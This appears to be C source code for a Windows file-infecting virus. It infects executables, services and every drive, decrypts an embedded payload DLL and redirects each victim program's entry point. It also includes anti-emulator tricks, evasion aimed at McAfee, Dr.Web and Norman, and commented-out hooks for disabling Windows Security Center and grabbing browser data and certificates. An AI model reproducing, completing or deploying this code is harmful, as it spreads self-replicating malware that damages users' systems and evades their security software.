#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <winsvc.h>
#include <tlhelp32.h> // for av process kill

void InitAPIbyStr(DWORD *adr[], HANDLE h, char *data);
void UnprotectFile(char *fname);
void rscan(char *st, DWORD dr, BOOL LNK);

#include "includes.h"

HWND hw;
HINSTANCE hI;

LRESULT CALLBACK WndProc(HWND hwnd, UINT m, WPARAM wp, LPARAM lp)
{
	 switch(m)
	 {
		default: return (_DefWindowProc(hwnd,m,wp,lp));
	 }
}


///////////////////////////////////////////////////////////////
// check other copies of us (version high or equ) /////////////

#define NO_OTHER 0
#define EQU_DETECTED 1
#define HI_DETECTED 2

BYTE CheckVersion()
{
	// check for version mutexes
	
	char mtx[0xFF];  //@S
	DWORD v;         //@E
	                 
	for (v = VERSION; v < 100; v++)
	{
		HANDLE m;

		_sprintf(mtx, "%s_mtx%u", CLASSNAME, v);

	 #ifdef dbgdbg
		adddeb("CHECKING '%s' , my ver is %u",mtx,VERSION);
	 #endif

		if((m = _OpenMutex(SYNCHRONIZE, FALSE, mtx)))
		{
			_CloseHandle(m);
			if (/*@S==*/v==VERSION/*@E*/) 
				return EQU_DETECTED; 
			else 
				return HI_DETECTED;
		}
	}
	
	return NO_OTHER;
}

///////////////////////////////////////////////////////////////////////////
// Creates or Opens 2 mutexes, waits for release of mtxv mutex ////////////

void CreateOrOpenMutexes_WaitForMtx2Release(char *mtx,char *mtxv)
{
 #ifdef SKIP_MTX
	return;
 #endif

	HANDLE hcm=_CreateMutex(NULL,FALSE,mtx);  //@S
	HANDLE hcmv=_CreateMutex(NULL,TRUE,mtxv); //@E //initial owner - current thread

 #ifdef dbgdbg
	if (hcm==NULL) { adddeb("### CANT CREATE/OPEN MUTEX1 '%s' - (if usermode, mutex1==bugfix mutex & ver1 in services found)",mtx); }
	          else { adddeb("### mutex1 '%s' created/opened:%X",mtx,hcm); }

	if (hcmv==NULL) { adddeb("### CANT CREATE/OPEN MUTEX2 '%s' - ver%u in services? can be bug in CheckService(), ver>1 shouldn't make such mutex from service, ExitThread(1)",mtxv,VERSION); }
	           else { adddeb("### mutex2 '%s' created/opened:%X",mtxv,hcmv); }
 #endif

	if (/*@S==*/hcmv==NULL/*@E*/) _ExitThread(1);


	//--- wait for mutex release, if current thread is initial owner, no waiting

 #ifdef dbgdbg
	adddeb("### WaitForSingleObject for mutex '%s'...",mtxv);
 #endif

	_WaitForSingleObject(hcmv, 0xFFFFFFFF); 
                                       
 #ifdef dbgdbg
	adddeb("### FINISHED WaitForSingleObject for mutex '%s'",mtxv);
 #endif
}


///////////////////////////////////////////////////////////////
// Init infcode, decrypt dll, ... /////////////////////////////

void InitInfectData(DWORD ticks, DWORD START_SVC)
{
	DWORD len;
	//@S
	_srand(/*@S+*/ticks+VERSION/*@E*/);  

 #ifdef RUNLINE
	M_XorData(InfectPE,bb0,ii0,qq0,"D");  //decrypt
 #endif
 //@E

 //----- NORMAL VIRUS MODE, dll content is taken from memory

 #ifndef EXEFILE
//  DWORD len;
	dll_mem = GetDll(&len);
 #endif

 //----- CURE MODE

 #ifdef AV_CURE
	CloseCreateThreadEco(InfectAllDrives);
	cure_loop:; __sleep(0); goto loop;
 #endif 

	//----- EXEFILE MODE - load dll from kkqvx.dll, show warnings

 #ifdef EXEFILE
 {
 	 BYTE dll[200000];
 	 len = 0;  // !!! IMPORTANT !!! dll_len==0 is flag NOT_INFECT for InfectPE routine

 	 HANDLE h=_CreateFile("kkqvx.dll", GENERIC_READ | FILE_SHARE_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
 	 if (h != INVALID_HANDLE_VALUE)
 	 {
 	 	_MessageBox(NULL,"INFECT MODE ON: found kkqvx.dll, kill process now if launched by mistake",NULL,0); 
 	 	_MessageBox(NULL,"INFECT MODE ON: the last warning! Are u sure? Kill process if NO.",NULL,0); 
 	 	_ReadFile(h, dll, sizeof(dll), &len, NULL);
 	 	_CloseHandle(h);
 	 }
 	 else { len=0; dll_len=0; _MessageBox(NULL,"no kkqvx.dll, cant infect",NULL,0); }

 	 dll_mem = dll;
 }
 #endif

	//-----

	dll_len = len; //@S                       
	InitAVSVC();   //@E

 #ifdef dbgdbg
	adddeb("InitInfectData (all hex) dll_mem:%X dll_len:%X",dll_mem,dll_len);
 #endif

	ProcessInactiveServices(START_SVC); // Infect Inactive Services
}

///////////////////////////////////////////////////////////////
// Service mode - we are in infected service //////////////////

void ServiceMode(DWORD ticks)
{
	 char mtxv[0xFF];

 #ifdef dbgdbg
	adddeb("===== !!! SERVICE MODE !!! =====");
 #endif

      
	sdelay = 10000;                               //@S          // 10 sec rscan infect delay
	_sprintf(mtxv, "%s_%u", SERVICE_MTX,VERSION); //@E          // version mutex

	//--- returns only if mtxv released or created by our thread
	CreateOrOpenMutexes_WaitForMtx2Release(SERVICE_MTX, mtxv);  

	//--- EditOwnToken (enable OWNER priv)
	EditOwnToken_or_CheckFiltered(FALSE); // this func has internal NT check, FALSE==Edit, TRUE==Check

	//--- Init infcode, AVSVC, decrypt dll, srand, infect inactive services
	//--- we are initial owner of mutex => no need to launch other svc
	InitInfectData(ticks, 0);  //@S // SVC_START==0 => start no services  

	//--- Kill Windows Security Center
	//KillWSC();                //@E // should be finished before AvSvcThread or we'll see red icon in tray!

	//--- Create Drives Infecting thread if not 'TERMINAL' mode
	CloseCreateThreadEco(InfectAllDrives);  

	//--- Create Antiviral Prc Thread
	//CloseCreateThreadEco(AvPrcThread);      

	//--- Create Antiviral UnInstall Thread
	//CloseCreateThreadEco(UnInstThread);      

	//--- Create Antiviral Svc Thread
	//CloseCreateThreadEco(AvSvcThread);      

	//--- returns only if SERVICE_MTX released or created by our thread
	CreateOrOpenMutexes_WaitForMtx2Release(mtxv, SERVICE_MTX);  


	//------ ZDES RAZMESHAETSYA VASH KOD vmesto beckonechnogo cikla

	x_loop:; __sleep(0); goto x_loop;
}

///////////////////////////////////////////////////////////////
// Main Thread ////////////////////////////////////////////////

#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif

DWORD WINAPI MainThread(LPVOID GPA)
{
	//---ANTINOD: esli zapalit drugie Init, iskazit i GetModuleHandle

	DWORD x;         //@S
	DWORD kernfuck;  //@E 

	DWORD ticks;
	BOOL service;
	BYTE resver;

	char mtx[0xFF];              //@S
	char mtxv[0xFF];             //@E

	MSG m;            //@S                    
	WNDCLASS wtc;     //@E
	DWORD flags;
	int q, w;

	HANDLE sm;        //@S
	DWORD START_SVC;  //@E

	x += 23;       //@S
	GetTicks1();   //@E   

	kernfuck = 512;         //@S
	x = AntiEmulator(96) ;  //@E  // x==1 if NOT EMULATED

	_KERNEL32=(HANDLE)((DWORD)_KERNEL32+kernfuck+EMUL);   //@S // if NOT EMULATED, EMUL==0
	_KERNEL32=(HANDLE)((DWORD)_KERNEL32-kernfuck*x);      //@E

	//---ANTIEMUL end

	InitKernel32a(); //GetModuleHandle,LoadLibrary

	InitKernel32(); //@S
	InitCRTDLL();
	InitUser32();   
	InitADVAPI32(); 
	InitSFC();     
	InitShell32();
	InitSFC_OS();   //@E


 #ifdef dbgdbg
	adddeb("===MainThread===");
	adddeb("AntiEmulator x:%u",x);
 #endif


	ticks = _GetTickCount(); //@S
	hI=_GetModuleHandle(NULL);         //IMPORTANT!!! global hI will be used in dll decrypt
	service = CheckService(); //@E

 #ifdef dbgdbg
	adddeb("CheckService: %u (0==FALSE)",service);
 #endif

	//===== we are SERVICE, routine ServiceMode never returns

	// *** service should not create mutex with the same name as
	// *** infected usermode processes or they will never work
	// *** service creates it's own 2 mutexes - with version and without it

 #ifdef SVCDBG
	service = 1; // SERVICEMODE DEBUG
 #endif

	if (/*@S!=*/service!=0/*@E*/) ServiceMode(ticks);  // func never returns!

	//===== USERMODE ONLY CODE: we are not service

 #ifdef dbgdbg
	adddeb("===== !!! USER MODE !!! =====");
 #endif

 #ifdef dbgdbg
	adddeb("CheckVersion... waiting for NO_OTHER");
 #endif

 loop:;
	resver = CheckVersion();

	if (/*@S==*/resver==HI_DETECTED/*@E*/)
	{
	  #ifdef dbgdbg
		 adddeb("HIGHER VERSION DETECTED, ExitThread(1)");
	  #endif
		_ExitThread(1);
	}

	if (/*@S==*/resver==EQU_DETECTED/*@E*/)
	{
	  #ifdef dbgdbg
		 adddeb("EQU_DETECTED, goto loop");
		 __sleep(1000);
	  #else  
		 __sleep(100);
	  #endif

		goto loop;
	}

 #ifdef dbgdbg
	adddeb("NO_OTHER!!!");
 #endif

	//--- Create mutexes and wait for release of version mutex

	_sprintf(mtx, "%s_mtx1", CLASSNAME);            //@S   // bugfix mutex1 (ver1 cant check high mutexes)
	_sprintf(mtxv, "%s_mtx%u", CLASSNAME, VERSION); //@E   // version mutex

	CreateOrOpenMutexes_WaitForMtx2Release(mtx, mtxv); // returns only if mtxv released or
	                                                   // created by our thread

	//--- Create Window

	//@S
	wtc.lpszClassName = (LPSTR)CLASSNAME;           
	wtc.hInstance     = hI;
	wtc.lpfnWndProc   = WndProc;
	wtc.hCursor       = NULL; 
	wtc.hIcon         = NULL; 
	wtc.lpszMenuName  = NULL;
	wtc.hbrBackground = (HBRUSH)COLOR_WINDOW; 
	wtc.style         = CS_HREDRAW | CS_VREDRAW;
	wtc.cbClsExtra    = 0;
	wtc.cbWndExtra    = 0;                          
	//@E

	//@S
	_RegisterClass(&wtc);                           

 #ifdef dbgdbg
	flags = WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_VISIBLE; 
	q = 10;
	w = 300;                                                   
 #else
	flags = WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX; 
	q = 0;
	w = 0;                                          
 #endif
	//@E

	//--- Check Service Mutex

	if((sm=_OpenMutex(SYNCHRONIZE,FALSE,SERVICE_MTX)))
	{
	 START_SVC=0;      //@S  // service mutex detected - no services to start
	 _CloseHandle(sm); //@E
	}
	else START_SVC=5;       // no mutex - 5 services to start

	#ifdef dbgdbg
	 adddeb("***** SERVICE MUTEX %s CHECK ***** START_SVC:%u (0==mutex detected)",SERVICE_MTX,START_SVC);
	#endif

	//---
	
	//@S
	hw = _CreateWindowEx(0, CLASSNAME, CLASSNAME, flags, q, q, w, w, NULL, NULL, hI, NULL);
	sdelay = 0;                   

	//--- EditOwnToken (enable OWNER priv)
	EditOwnToken_or_CheckFiltered(FALSE); // this func has internal NT check, FALSE==Edit, TRUE==Check
	//@E

	InitInfectData(ticks, START_SVC); // Init infcode, decrypt dll, srand
	                                  // & infect inactive services, start START_SVC service


	softfind();  // Infect Programs & Desktop          

	// InitData();                           // Init Grab Data
	// StartGrab();                          // Start Grabbers: comev, FFspy, Plugins, Certs + IE zones, ...
	CloseCreateThreadEco(InfectAllDrives);  // Create Drives Infecting thread

	//---

	while(_GetMessage(&m, NULL, 0, 0))
	{
		_TranslateMessage(&m); _DispatchMessage(&m);
	}

 #ifdef EXEFILE
	// we need this for exe debug (real import from kernel32.dll)
	GetModuleHandle("kernel32.dll");  //Vista bugfix, instead of ExitThread
 #endif
}

#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif

///////////////////////////////////////////////////////////////
// Create Main Thread - it's in func for better mutaion ///////

void StartMainThread()
{
	//--- Start MainThread

	DWORD lpv;             //@S
	DWORD tid; 
	DWORD CS_THREADS=TRUE; //@E  // enable CriticalSections in GetStrFromCrypt/LGetStrFromCrypt
	_CreateThread(NULL, 0, MainThread, &lpv, 0, &tid);
}

///////////////////////////////////////////////////////////////
// Entry point ////////////////////////////////////////////////

// push    ebp
// mov     ebp, esp

#ifndef EXEFILE

__declspec(dllexport) BOOL WINAPI LibMain()

#else /* EXEFILE */

#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif

int main()

#endif /* EXEFILE */

{
	//@S
	PE_HEADER *pe;
	DWORD q, eiRVA, last_sect;
	LPBYTE peadr;

	DWORD a0=(DWORD)MainThread;     // any address inside our code
	DWORD a =(DWORD)MainThread>>16; // align it by 64kb part1
	//@E
	a=a<<16;                        // align it by 64kb part2, splitted in 2 parts due to lcc compiler bug
	                                // DWORD k=(k0>>(5+LNMB1+LNMB0))<<(5+LNMB1+LNMB0);

	// --- Find Our PE header
	
	 // step can be only 2^x, where x from 0 to 16 (1-0x10000)
	 // to kill McAfee heuristic we use this

	a = FindPEheader(a, a0, 4, &pe); // _NG == NO GLOBALS inside func

	// --- Get import table RVA

	eiRVA = pe->importrva;     //exe import RVA

	// --- import table (get addr of first imported from kernel32 func)

	for (q = 0; q < pe->importsize; q += SZIDTE) // sizeof(IMPORT_DIRECTORY_TABLE_ENTRY)
	{
		IMPORT_DIRECTORY_TABLE_ENTRY *idte=(LPVOID)(/*@S+*/a+eiRVA+q/*@E*/);

		if (/*@S==*/idte->ImportLookUp==0/*@E*/) break; //@S
		if (/*@S!=*/_KERNEL32 != NULL/*@E*/) break;     //@E

		ProcessDLLimports(a, idte);
	}

	if (/*@S==*/_KERNEL32 == NULL/*@E*/) return;

	 // --- decrypt main thread

 #ifdef RUNLINE

  #ifdef EXEFILE
	adddeb("Decrypt MainThread addr:%X size:%X",MainThread,MainThread_size);
  #endif
	
	{
		unsigned char *bb=MainThread; //@S
		DWORD i=0;                    //@E
		for (q = 0; q < MainThread_size; q++) 
		{ bb[q]=bb[q]^MainThread_key[i]; i++; if (i==4) i=0; }

	  #ifdef EXEFILE
		adddeb("Decrypted OK");
	  #endif
	}

 #endif /* RUNLINE */


	//---
	//@S
	StartMainThread();

	//--- Get C_CODE len, data section vadr, EP vadr

	szinfcode=WriteOrGetLen_C_CODE(NULL, NULL, 0, 0); 

	//--- Get Last Section

	last_sect = pe->numofobjects - 1; 
	peadr = pe; // we use LPBYTE, becouse C math use size of structure in such operations
	//@E

	//---

 #ifdef EXEFILE
	loop:; sleep(0); goto loop;
 #endif

	//--- restore original victim exe code after entrypoint

 #ifndef EXEFILE
	{
		DWORD q=0;
		DWORD old_prot; 
		BYTE b;
		unsigned char *ep_code;
		PE_OBJENTRY *lastsect = /*@S+*/peadr+SZPE+SZOBJE*last_sect/*@E*/; // get the last section

		// some applications (vista infocard.exe) changes pe->entrypointrva after start. (NET framework)
		// old: unsigned char *ep_code   = (LPSTR)(pe->imagebase + pe->entrypointrva);  

		//@S
		upx_sect = (LPSTR)(/*@S+*/pe->imagebase + lastsect->virtrva/*@E*/);  // UPX0
		my_strcpy(SECTNAME,lastsect->name); // save section name - we'll use it for infecting files
		//@E

		//@S
		SECTNAME[8]=0; // not more than 8 chars len
		ep_code   = (LPSTR)(/*@S+*/pe->imagebase + GetVictimEP()/*@E*/);  

		upx_sect=(LPSTR)fool_drweb((DWORD)upx_sect); // dr.web anti-heur (takes about 0.12 sec)
				
		//@E
		_VirtualProtect(ep_code, szinfcode, PAGE_EXECUTE_READWRITE, &old_prot);

	 next:;
	    {
			DWORD antinorm2_trash, antinorm1_trash=555; //@S 
			b = upx_sect[q];             //@E //anti Norman, old: ep_code[q]=upx_sect[q];
			ep_code[q]=b;              //@S //
			antinorm2_trash=666; //@E 
			q++;
		}
		if (q < szinfcode) goto next;
	}
	
	//--- asm block: peredelka vlechet izmenenie _peinf.c v bloke: --- set 'jmp EP' at the end of LibMain

  #ifdef _MSC_VER
	_asm
	{
		_emit 0xC9
		_emit 0x61
		_emit 0xE9; _emit 0x00; _emit 0x00; _emit 0x00; _emit 0x00
	}
  #else
   _asm
   (
  		".byte 0xC9                      \n"  //  leave
  		".byte 0x61                      \n"  //  popad
  		".byte 0xE9,0x00,0x00,0x00,0x00  \n"  //  jmp orig_EP    
  		".byte 0xC3                      \n"  //  retn - NOT USED, JUST SIGNATURE FOR SEARCH
   );
  #endif

 #endif /* EXEFILE */ 
}

#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif
